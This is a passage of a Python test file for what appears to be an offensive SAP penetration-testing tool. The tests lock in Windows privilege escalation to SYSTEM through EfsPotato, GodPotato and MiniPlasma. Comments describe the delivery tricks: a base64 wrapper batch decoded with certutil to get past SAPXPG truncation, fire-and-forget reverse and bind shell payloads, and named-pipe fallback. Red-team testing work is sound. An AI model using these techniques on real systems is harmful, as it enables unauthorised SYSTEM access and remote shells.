    assert out["vulnerable"] is False
    assert "4.7.2" in out["reason"]


def test_picker_prefers_efspotato_when_all_viable():
    """All three techniques viable -> picker chooses EfsPotato
    (broadest service-account coverage; multi-pipe fallback)."""
    from sapmap_winlpe_auto import check_windows_lpe
    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_cldflt": True, "net_version": "4.8",
            "blob_available": True, "reason": "OK", "details": {}}):
        out = check_windows_lpe(_node())
    assert out["method"] == "efspotato"


def test_picker_falls_back_to_godpotato_when_efspotato_unavailable():
    """No EfsPotato blob vendored but GodPotato is -> godpotato wins."""
    from sapmap_winlpe_auto import check_windows_lpe
    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": False, "os_build": "10.0.19045",
            "has_impersonate": True, "blob_available": False,
            "reason": "blob not vendored", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.19045",
            "has_cldflt": True, "net_version": "4.8",
            "blob_available": True, "reason": "x", "details": {}}):
        out = check_windows_lpe(_node())
    assert out["method"] == "godpotato"


def test_run_windows_lpe_dispatches_to_efspotato():
    """Picker selects efspotato -> run_windows_lpe calls efspotato.run_as_system."""
    from sapmap_winlpe_auto import run_windows_lpe
    n = _node()
    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": True, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "x", "details": {}}), \
         patch("sapmap_efspotato.run_as_system", return_value={
            "ok": True, "stdout": "nt authority\\system", "error": ""}):
        out = run_windows_lpe(n, "whoami")
    assert out["ok"] is True
    assert out["method"] == "efspotato"
    assert n.efspotato_system_obtained is True


def test_force_env_efspotato_overrides_picker():
    """SAPMAP_WINLPE_FORCE=efspotato forces selection."""
    from sapmap_winlpe_auto import check_windows_lpe
    with patch.dict(os.environ, {"SAPMAP_WINLPE_FORCE": "efspotato"}), \
         patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": False, "os_build": "10.0.7600",
            "has_impersonate": False, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": True, "os_build": "10.0.7600",
            "has_impersonate": True, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.7600",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "x", "details": {}}):
        out = check_windows_lpe(_node())
    assert out["method"] == "efspotato"


# ===========================================================================
# OS-exec re-routing through Windows LPE for SYSTEM context
# ===========================================================================
# When the operator picks method="winlpe_system" in the OS Command
# Terminal or Reverse/Bind Shell modal, the backend should route the
# command/payload through sapmap_winlpe_auto.run_windows_lpe() and
# adapt the {ok, stdout, method, error} return shape to the
# {success, output, error} shape exec_command/shell_start expect.


def test_run_windows_lpe_result_shape_matches_exec_command_adapter():
    """The OS terminal's winlpe_system branch + the shell-start's
    winlpe_system branch BOTH unpack run_windows_lpe's return dict
    into the exec-command response shape:
      out["success"]  = lpe_res["ok"]
      out["output"]   = lpe_res["stdout"].splitlines()
      out["error"]    = lpe_res["error"]
      out["winlpe_method"] = lpe_res["method"]
    Lock the four-field shape so the adapter doesn't silently drop
    one of them when run_windows_lpe gains new keys later."""
    from sapmap_winlpe_auto import run_windows_lpe
    n = _node()

    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": True, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "x", "details": {}}), \
         patch("sapmap_efspotato.run_as_system", return_value={
            "ok": True,
            "stdout": "nt authority\\system\r\nLine2\r\nLine3",
            "error": ""}):
        lpe_res = run_windows_lpe(n, "whoami")

    adapted = {
        "success": bool(lpe_res.get("ok")),
        "output": (lpe_res.get("stdout") or "").splitlines(),
        "error": lpe_res.get("error", ""),
        "winlpe_method": lpe_res.get("method", ""),
    }
    assert adapted["success"] is True
    assert adapted["output"] == ["nt authority\\system", "Line2", "Line3"]
    assert adapted["error"] == ""
    assert adapted["winlpe_method"] == "efspotato"


def test_run_windows_lpe_failure_adapter_preserves_error():
    """When no Windows LPE method is viable, run_windows_lpe returns
    ok=False with an explanatory error.  The adapter must surface
    that error verbatim so the operator sees a clear reason in the
    OS terminal / shell modal."""
    from sapmap_winlpe_auto import run_windows_lpe
    n = _node(gw=False, cve_31324=False)

    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": False, "os_build": "", "has_impersonate": False,
            "blob_available": False, "reason": "no exec primitive",
            "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "", "has_impersonate": False,
            "blob_available": False, "reason": "no exec primitive",
            "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "", "has_cldflt": False,
            "net_version": "", "blob_available": False,
            "reason": "no exec primitive", "details": {}}):
        lpe_res = run_windows_lpe(n, "whoami")

    adapted = {
        "success": bool(lpe_res.get("ok")),
        "output": (lpe_res.get("stdout") or "").splitlines(),
        "error": lpe_res.get("error", ""),
        "winlpe_method": lpe_res.get("method", ""),
    }
    assert adapted["success"] is False
    assert "No working Windows LPE" in adapted["error"]
    assert adapted["winlpe_method"] == ""


# ===========================================================================
# fire_and_forget mode — shell-deployment payloads write to a socket
# ===========================================================================
# Operator-reported regression (SJJ): EfsPotato successfully spawned the
# SYSTEM child for the reverse/bind shell payload (lsarpc/samr/netlogon
# all printed "[!] process with pid: NNNN created."), but the existing
# stdout-based success criterion required non-empty post-separator
# stdout — which a shell payload never produces because it writes to a
# network socket, not stdout.  fire_and_forget mode flips the criterion
# to "spawn signal present" so the runner correctly reports SUCCESS as
# soon as EfsPotato confirms CreateProcessAsUser landed.


# Canonical EfsPotato banner.  Reproduced verbatim from the SJJ lab
# capture so future regressions can be debugged against a real sample.
# Note the lower-case "process" — EfsPotato logs it in lower-case in
# the version we vendor.
_EFSPOTATO_BANNER_SPAWNED = (
    "EfsPotato by zcgonvh - exploit MS-EFSRPC for LPE\r\n"
    "[+] Current user: NT AUTHORITY\\NETWORK SERVICE\r\n"
    "[+] Pipe: lsarpc\r\n"
    "[+] Get Token\r\n"
    "[!] process with pid: 9872 created.\r\n"
    "==============================\r\n"
)

# Same banner but coercion failed (no "process created" line, no
# separator).  Used to confirm fire_and_forget correctly rejects
# pipes where no SYSTEM child spawned.
_EFSPOTATO_BANNER_FAILED = (
    "EfsPotato by zcgonvh - exploit MS-EFSRPC for LPE\r\n"
    "[+] Current user: NT AUTHORITY\\NETWORK SERVICE\r\n"
    "[+] Pipe: lsarpc\r\n"
    "[x] EfsRpcEncryptFileSrv failed: 0x000006d9 - "
    "EPT_S_NOT_REGISTERED\r\n"
)


def _make_fake_gw_for_efspotato(efspotato_banner_by_pipe):
    """Build a fake gateway callable for run_as_system.

    Returns a callable matching the (stdout, ok) shape that _make_exec
    hands out, plus a chunk_size + label triple consumable as the full
    _make_exec return value.

    ``efspotato_banner_by_pipe`` maps pipe name -> banner string the
    EfsPotato exe should "print" for that pipe.  Any pipe missing from
    the dict gets an empty banner (simulates that pipe failing).
    """
    from sapmap_efspotato import _TARGET_EXE

    def _fake_gw(prog, params="", lp=""):
        # EfsPotato call: prog == _TARGET_EXE, params == '"<inner>" <pipe>'
        if prog == _TARGET_EXE:
            pipe = params.rsplit(" ", 1)[-1].strip()
            return efspotato_banner_by_pipe.get(pipe, ""), True
        # All other commands (cleanup, chunked upload, certutil decode,
        # SHA hashfile probe) succeed silently.  SHA verification skips
        # when sha_out is empty (no 64-hex-char line found).
        return "", True
    return _fake_gw


def test_long_command_dropped_as_wrapper_batch_via_base64():
    """SAPXPG PARAMS truncates at ~255 bytes.  Operator-reported
    regression on TWT (ABAP/Windows, gateway-only path): the
    bind-shell PowerShell wrapper command (~3000 chars) caused
    EfsPotato to fail with `no process created` on every pipe in
    <1s — symptom of EfsPotato receiving a mangled argv (no
    closing quote + no pipe argument) because SAPXPG silently
    truncated PARAMS to the first 255 bytes.

    Fix: when inner_cmd would exceed the 200-byte conservative
    budget, drop the operator command as a wrapper .bat via the
    same base64 + certutil chain we already use for the binary
    itself, then invoke EfsPotato with a short
    `cmd /c <wrap.bat>` reference.  The .bat carries the full
    operator command intact, and what reaches the gateway is
    ~70 bytes — well inside the budget.

    Lock both halves of the fix: (a) wrapper .bat IS delivered
    via certutil-decode of a .b64, and (b) EfsPotato is invoked
    with the SHORT bat reference, not the original 3000-char
    inner_cmd."""
    from sapmap_efspotato import run_as_system, _TARGET_EXE, _TARGET_WRAP

    # Capture every gateway call so we can inspect what was
    # delivered + how EfsPotato was finally invoked.
    gw_calls = []
    def _fake_gw(prog, params="", lp=""):
        gw_calls.append((prog, params))
        if prog == _TARGET_EXE:
            return _EFSPOTATO_BANNER_SPAWNED, True
        return "", True

    # Build a long operator command simulating the bind-shell
    # encoded PowerShell wrapper from the TWT regression.  3500
    # chars is well past the 200-byte threshold.
    long_cmd = ("powershell.exe -NoProfile -EncodedCommand "
                + "Q" * 3500)

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1, "sha256": "a" * 64}), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(_fake_gw, 100, "gw_sapxpg")), \
         patch("time.sleep"):
        # patch time.sleep globally so the new post-exploit
        # diagnostic probe's 4s wait (for the .bat + inner
        # PowerShell to settle before reading the diag file +
        # netstat snapshot) doesn't slow tests.  In unit context
        # the gw is mocked so there's nothing to actually wait for.
        out = run_as_system(_node(), long_cmd, fire_and_forget=True)

    assert out["ok"] is True, out

    # (a) Wrapper .bat must have been certutil-decoded from a
    # .b64.  Look for a `certutil.exe -decode` call that
    # references the wrapper path.
    decode_calls = [
        a for (p, a) in gw_calls
        if p == "cmd.exe"
        and "certutil.exe -decode" in a
        and "ef_run.bat" in a
    ]
    assert len(decode_calls) >= 1, (
        "Wrapper batch certutil-decode never invoked; gw_calls: "
        + repr([a[:120] for (p, a) in gw_calls[:30]]))

    # The .b64 staging file must have been chunked-echoed to
    # disk before the decode (>=1 echo call that writes to
    # ef_run.bat.b64).
    echo_calls = [
        a for (p, a) in gw_calls
        if p == "cmd.exe" and "echo" in a and "ef_run.bat.b64" in a
    ]
    assert len(echo_calls) >= 1, (
        "Wrapper .b64 was never written via chunked echo")

    # (b) EfsPotato MUST have been invoked with a short cmd line
    # that references the wrapper - NOT the original 3000-char
    # inner_cmd.
    efspotato_calls = [(p, a) for (p, a) in gw_calls if p == _TARGET_EXE]
    assert len(efspotato_calls) >= 1, "EfsPotato never invoked"
    for (_, params) in efspotato_calls:
        # Sanity: the SAPXPG-bound params must be small.  ~70 bytes
        # in practice; 150 is a safe upper bound that still catches
        # any regression where the long inner_cmd leaks through.
        assert len(params) < 150, (
            f"EfsPotato params should be ~70 bytes after wrapping; "
            f"got {len(params)} bytes: {params[:200]!r}")
        # And the params must reference the wrapper bat path so
        # EfsPotato is actually running our wrapper rather than
        # something else.
        assert "ef_run.bat" in params, (
            f"EfsPotato params don't reference wrapper batch: "
            f"{params[:200]!r}")
        # CRITICAL: must NOT have nested double quotes (TWT
        # regression: pre-fix the inner_cmd was `cmd /c "<wrap>"`
        # which when wrapped in the SAPXPG transport's outer
        # quotes produced `"cmd /c "<wrap>""` — Windows
        # CommandLineToArgvW parses that to
        # `argv[1] = cmd /c <wrap>"` with a TRAILING literal `"`,
        # so cmd.exe tries to execute a non-existent file
        # `.ef_run.bat"` and silently dies before the PowerShell
        # wrapper inside the bat runs.  Net effect: pid spawned,
        # no listener.
        #
        # The fix is to NOT quote the wrap path in inner_cmd (it
        # has no spaces).  Lock that by asserting the params
        # contains exactly TWO `"` chars - the SAPXPG transport's
        # outer pair only.
        quote_count = params.count('"')
        assert quote_count == 2, (
            f"EfsPotato params must contain exactly 2 quote chars "
            f"(SAPXPG transport's outer pair only); got "
            f"{quote_count} in {params!r}.  Adjacent `\"\"` pairs "
            f"break CommandLineToArgvW parsing and the SYSTEM "
            f"child dies before running the PowerShell wrapper.")


def test_long_command_path_probes_diag_file_after_exploit():
    """The wrapper-batch path embeds bat_started / bat_done markers
    around the operator command and writes them to a diag file.
    After fire-and-forget success, the runner must read that diag
    file back via SAPXPG + dump netstat so the operator sees
    WHICH stage failed when the listener doesn't connect despite
    the SYSTEM spawn signal firing.

    Lock the probe: (a) `type "<diag>"` call happens after the
    EfsPotato call, (b) `netstat -an -p TCP | findstr LISTENING`
    call happens too."""
    from sapmap_efspotato import run_as_system, _TARGET_EXE, _TARGET_DIAG

    gw_calls = []
    def _fake_gw(prog, params="", lp=""):
        gw_calls.append((prog, params))
        if prog == _TARGET_EXE:
            return _EFSPOTATO_BANNER_SPAWNED, True
        # Simulate the diag file existing with both markers (happy
        # path: .bat ran to completion).
        if prog == "cmd.exe" and "type" in params and "ef_diag" in params:
            return ("bat_started 14:30:00 as SAPServiceTWT\r\n"
                    "bat_done errlvl=0 time=14:30:01\r\n"), True
        # Simulate a netstat snapshot.
        if prog == "cmd.exe" and "netstat" in params:
            return ("  TCP    0.0.0.0:4444    0.0.0.0:0    LISTENING\r\n"
                    "  TCP    0.0.0.0:445     0.0.0.0:0    LISTENING\r\n"), True
        return "", True

    long_cmd = "powershell.exe -NoProfile -EncodedCommand " + "Q" * 3500

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1, "sha256": "a" * 64}), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(_fake_gw, 100, "gw_sapxpg")), \
         patch("time.sleep"):
        out = run_as_system(_node(), long_cmd, fire_and_forget=True)

    assert out["ok"] is True, out

    # Diag file read-back call (`type "<diag>"`).
    diag_reads = [a for (p, a) in gw_calls
                    if p == "cmd.exe" and "type" in a and "ef_diag" in a]
    assert len(diag_reads) >= 1, (
        "Diag file should be probed via `cmd /C type <diag>` on the "
        "wrapper-batch path; gw_calls didn't contain one")

    # netstat LISTENING dump
    netstat_calls = [a for (p, a) in gw_calls
                       if p == "cmd.exe" and "netstat" in a]
    assert len(netstat_calls) >= 1, (
        "netstat LISTENING snapshot should be probed after exploit; "
        "operator needs to see whether the bind-shell port opened "
        "on the target.")


def test_short_command_path_skips_diag_probe():
    """The diag probe only makes sense when the wrapper-batch path
    was taken (the diag file is only WRITTEN by the wrapper batch).
    On the short-command path (OS Terminal `whoami` etc.), the
    diag probe must be skipped - probing a non-existent file
    every time would just waste a SAPXPG round-trip + pollute the
    log with confusing 'diag not found' lines."""
    from sapmap_efspotato import run_as_system, _TARGET_EXE

    gw_calls = []
    def _fake_gw(prog, params="", lp=""):
        gw_calls.append((prog, params))
        if prog == _TARGET_EXE:
            return _EFSPOTATO_BANNER_SPAWNED, True
        return "", True

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1, "sha256": "a" * 64}), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(_fake_gw, 100, "gw_sapxpg")), \
         patch("time.sleep"):
        # Short command + fire_and_forget=True (hypothetical case
        # where a short shell payload still uses fire_and_forget)
        out = run_as_system(_node(), "powershell -enc XYZ",
                              fire_and_forget=True)

    assert out["ok"] is True, out

    # No `type` probe of the diag file (cleanup `del`s with
    # ef_diag in the path are fine - those run on every path).
    # And no netstat probe at all.
    diag_reads = [a for (p, a) in gw_calls
                    if p == "cmd.exe"
                    and "type" in a and "ef_diag" in a]
    netstat_calls = [a for (p, a) in gw_calls
                       if p == "cmd.exe" and "netstat" in a]
    assert len(diag_reads) == 0, (
        f"Short-command path must NOT probe diag file; got: "
        f"{diag_reads}")
    assert len(netstat_calls) == 0, (
        f"Short-command path must NOT probe netstat; got: "
        f"{netstat_calls}")


def test_short_command_skips_wrapper_batch():
    """OS Terminal `whoami` -> inner_cmd `cmd /c whoami` (13 chars).
    Must NOT trigger the wrapper-batch delivery — that's extra
    SAPXPG round-trips for no reason and leaves a .bat artefact on
    disk.  The short-command happy path must invoke EfsPotato
    directly with the original inner_cmd."""
    from sapmap_efspotato import run_as_system, _TARGET_EXE

    gw_calls = []
    def _fake_gw(prog, params="", lp=""):
        gw_calls.append((prog, params))
        if prog == _TARGET_EXE:
            return _EFSPOTATO_BANNER_SPAWNED + "nt authority\\system\r\n", True
        return "", True

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1, "sha256": "a" * 64}), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(_fake_gw, 100, "gw_sapxpg")):
        out = run_as_system(_node(), "whoami")

    assert out["ok"] is True, out

    # No wrapper certutil decode + no .b64 echo for the wrapper.
    decode_calls = [
        a for (p, a) in gw_calls
        if p == "cmd.exe"
        and "certutil.exe -decode" in a
        and "ef_run.bat" in a
    ]
    assert len(decode_calls) == 0, (
        f"Short command shouldn't trigger wrapper batch; got: "
        f"{decode_calls}")

    # EfsPotato received the original inner_cmd directly.
    efspotato_calls = [(p, a) for (p, a) in gw_calls if p == _TARGET_EXE]
    assert len(efspotato_calls) >= 1
    assert "whoami" in efspotato_calls[0][1], (
        f"EfsPotato should have run whoami directly; got: "
        f"{efspotato_calls[0][1]!r}")


def test_fire_and_forget_succeeds_when_spawn_signal_present_but_no_stdout():
    """The SJJ regression: EfsPotato landed CreateProcessAsUser
    (banner shows "[!] process with pid: 9872 created."), but the
    operator command is a reverse-shell PowerShell that writes to a
    network socket — so EfsPotato's post-separator stdout is empty.

    fire_and_forget=True must report ok=True regardless of empty
    captured stdout, citing the spawned PID."""
    from sapmap_efspotato import run_as_system

    fake_gw = _make_fake_gw_for_efspotato({
        "lsarpc": _EFSPOTATO_BANNER_SPAWNED,
    })

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1,
            "sha256": "a" * 64,   # bogus but fine — SHA probe returns empty
            }), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(fake_gw, 100, "gw_sapxpg")):
        out = run_as_system(_node(), "powershell -enc ...",
                              fire_and_forget=True)

    assert out["ok"] is True, out
    # PID extracted from the banner and surfaced in the stdout summary
    # so the operator sees which SYSTEM child got spawned.
    assert "9872" in out["stdout"]
    assert "fire-and-forget" in out["stdout"].lower()
    # The pipe that won is recorded in details for engagement reporting.
    assert out["details"]["succeeded_pipe"] == "lsarpc"


def test_fire_and_forget_false_fails_when_post_separator_stdout_empty():
    """Same banner (spawn happened, no stdout) but default mode —
    must fail.  This locks in the asymmetry between the two modes so
    the OS Terminal path (which legitimately requires captured
    stdout) doesn't silently start reporting success when the SYSTEM
    child crashed before printing anything."""
    from sapmap_efspotato import run_as_system

    # ALL pipes produce the spawn signal but no post-separator stdout.
    # In normal mode this must surface as "None of the EFSRPC pipes
    # succeeded" — the operator's command produced no output, which in
    # OS-terminal context is a failure (operator expects whoami /
    # ipconfig / etc output).
    fake_gw = _make_fake_gw_for_efspotato({
        pipe: _EFSPOTATO_BANNER_SPAWNED
        for pipe in ("lsarpc", "efsrpc", "samr", "netlogon")
    })

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1, "sha256": "a" * 64}), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(fake_gw, 100, "gw_sapxpg")):
        out = run_as_system(_node(), "whoami")   # fire_and_forget default=False

    assert out["ok"] is False, out
    assert "None of the EFSRPC pipes succeeded" in out["error"]


def test_fire_and_forget_falls_through_pipes_until_spawn_signal():
    """First two pipes produced no "process created" line (coercion
    failed); third pipe succeeded.  fire_and_forget must iterate
    through pipes and stop at the first one with a spawn signal."""
    from sapmap_efspotato import run_as_system

    fake_gw = _make_fake_gw_for_efspotato({
        "lsarpc":   _EFSPOTATO_BANNER_FAILED,
        "efsrpc":   _EFSPOTATO_BANNER_FAILED,
        "samr":     _EFSPOTATO_BANNER_SPAWNED,    # finally spawns
        # netlogon intentionally absent — must not be tried since samr won
    })

    with patch("sapmap_efspotato._load_blob", return_value={
            "hex": "00", "size": 1, "sha256": "a" * 64}), \
         patch("sapmap_efspotato._make_exec",
                 return_value=(fake_gw, 100, "gw_sapxpg")):
        out = run_as_system(_node(), "powershell -enc ...",
                              fire_and_forget=True)

    assert out["ok"] is True, out
    assert out["details"]["succeeded_pipe"] == "samr"
    # Three pipes attempted (lsarpc fail, efsrpc fail, samr win).
    # netlogon never tried.
    tried_pipes = [p["pipe"] for p in out["details"]["pipes_tried"]]
    assert tried_pipes == ["lsarpc", "efsrpc", "samr"]


def test_run_windows_lpe_forwards_fire_and_forget_to_efspotato():
    """The reverse/bind shell handler in sapmap_gui.py calls
    run_windows_lpe(node, full_cmd, fire_and_forget=True).  Lock the
    forwarding so a future refactor doesn't silently drop the flag —
    that's exactly the regression we just fixed (shells reported
    failure because the flag wasn't reaching EfsPotato)."""
    from sapmap_winlpe_auto import run_windows_lpe

    captured_kwargs = {}

    def _fake_run_as_system(node, command, timeout=90.0,
                              fire_and_forget=False,
                              av_evasion=False):
        captured_kwargs["fire_and_forget"] = fire_and_forget
        captured_kwargs["command"] = command
        return {"ok": True, "stdout": "[fire-and-forget] pid=9872",
                "error": ""}

    n = _node()
    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": True, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "x", "details": {}}), \
         patch("sapmap_efspotato.run_as_system",
                 side_effect=_fake_run_as_system):
        out = run_windows_lpe(n, "powershell -enc shellpayload",
                                fire_and_forget=True)

    assert out["ok"] is True
    assert out["method"] == "efspotato"
    # The flag MUST reach EfsPotato verbatim.
    assert captured_kwargs["fire_and_forget"] is True
    assert captured_kwargs["command"] == "powershell -enc shellpayload"


# ===========================================================================
# SYSTEM badge — Windows mirror of the Linux ROOT triangle
# ===========================================================================
# When EfsPotato / GodPotato / MiniPlasma lands SYSTEM, the host's SVG
# box in the map gets a blue diamond in its top-right (same position
# as the Linux root triangle, distinct shape + colour).  Hover tooltip
# names the winning technique.  These tests lock the wiring against
# silent refactor breakage — a renamed model field would otherwise
# leave the badge dark with no test failure.


def test_system_badge_references_all_three_winlpe_obtained_flags():
    """The SVG badge JS must read EACH of the three *_system_obtained
    fields.  If any one is renamed without updating the badge code, the
    operator loses the visual signal for that technique - and the bug
    is invisible until someone happens to use that technique in the
    lab.  Lock all three field names here."""
    import sapmap_html
    html = sapmap_html.get_html()
    assert "n.efspotato_system_obtained" in html, (
        "EfsPotato SYSTEM flag missing from badge wiring")
    assert "n.godpotato_system_obtained" in html, (
        "GodPotato SYSTEM flag missing from badge wiring")
    assert "n.miniplasma_system_obtained" in html, (
        "MiniPlasma SYSTEM flag missing from badge wiring")


def test_system_badge_uses_distinct_glyph_from_linux_root():
    """Linux uses ▲ (U+25B2 / &#9650;).  Windows MUST use a different
    shape so a glance at the map distinguishes the two without
    reading colour - colour-blindness accessibility + screenshots
    in grayscale reports.  Currently: ◆ (U+25C6 / &#9670; diamond)."""
    import sapmap_html
    html = sapmap_html.get_html()
    assert "&#9650;" in html, "Linux root ▲ glyph removed?"
    assert "&#9670;" in html, "Windows SYSTEM ◆ glyph missing"


def test_system_badge_tooltip_names_winning_technique():
    """The diamond has a <title> child that names which Windows LPE
    technique landed SYSTEM (EfsPotato / GodPotato / MiniPlasma).
    Operator hovers the icon -> immediately sees which exploit ran,
    without having to open the side panel.  Lock the three method
    names in the tooltip string."""
    import sapmap_html
    html = sapmap_html.get_html()
    # The badge JS builds the tooltip from a ternary chain:
    #   winLpeMethod = efspotato ? 'EfsPotato'
    #                : godpotato ? 'GodPotato'
    #                : 'MiniPlasma'
    assert "'EfsPotato'" in html
    assert "'GodPotato'" in html
    assert "'MiniPlasma'" in html
    # The tooltip wraps that into "NT AUTHORITY\SYSTEM obtained via X"
    assert "NT AUTHORITY" in html and "SYSTEM obtained via" in html


def test_run_windows_lpe_default_fire_and_forget_is_false():
    """OS Command Terminal calls run_windows_lpe WITHOUT the
    fire_and_forget kwarg — the operator expects captured stdout so
    they can see `whoami` returning `nt authority\\system`.  Default
    must be False so the existing OS Terminal behaviour is preserved.
    """
    from sapmap_winlpe_auto import run_windows_lpe

    captured_kwargs = {}

    def _fake_run_as_system(node, command, timeout=90.0,
                              fire_and_forget=False,
                              av_evasion=False):
        captured_kwargs["fire_and_forget"] = fire_and_forget
        return {"ok": True, "stdout": "nt authority\\system", "error": ""}

    n = _node()
    with patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": True, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "x", "details": {}}), \
         patch("sapmap_efspotato.run_as_system",
                 side_effect=_fake_run_as_system):
        out = run_windows_lpe(n, "whoami")   # NO fire_and_forget kwarg

    assert out["ok"] is True
    assert captured_kwargs["fire_and_forget"] is False
